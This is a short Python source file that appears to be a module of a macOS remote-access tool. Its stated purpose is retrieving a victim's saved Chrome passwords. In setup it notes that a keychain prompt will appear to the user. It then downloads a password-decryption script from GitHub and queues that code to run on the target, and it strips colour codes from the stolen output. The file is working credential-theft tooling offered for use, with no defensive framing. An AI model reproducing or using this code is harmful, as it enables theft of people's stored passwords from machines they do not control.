import urllib2
import re


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Retrieves Chrome passwords.",
            "References": [
                "https://github.com/manwhoami/OSXChromeDecrypt"
            ]
        }
        self.code = None

    def setup(self, module_view, output_view, successful):
        module_view.add("This will prompt the user to allow keychain access.", "attention")
        confirm = module_view.prompt("Are you sure you want to continue? [Y/n]: ").lower()

        if not confirm or confirm == "y":
            request_url = "https://raw.githubusercontent.com/manwhoami/OSXChromeDecrypt/master/chrome_passwords.py"
            request = urllib2.Request(url=request_url)
            response = "".join(urllib2.urlopen(request).readlines())

            self.code = response
            successful.put(True)
        else:
            output_view.add("Cancelled", "info")
            successful.put(False)

    def run(self):
        return self.code

    def process_response(self, output_view, response):
        # Remove the useless colors, thanks.
        output_view.add(re.sub(r'\[.*?;.*?m', '', response))
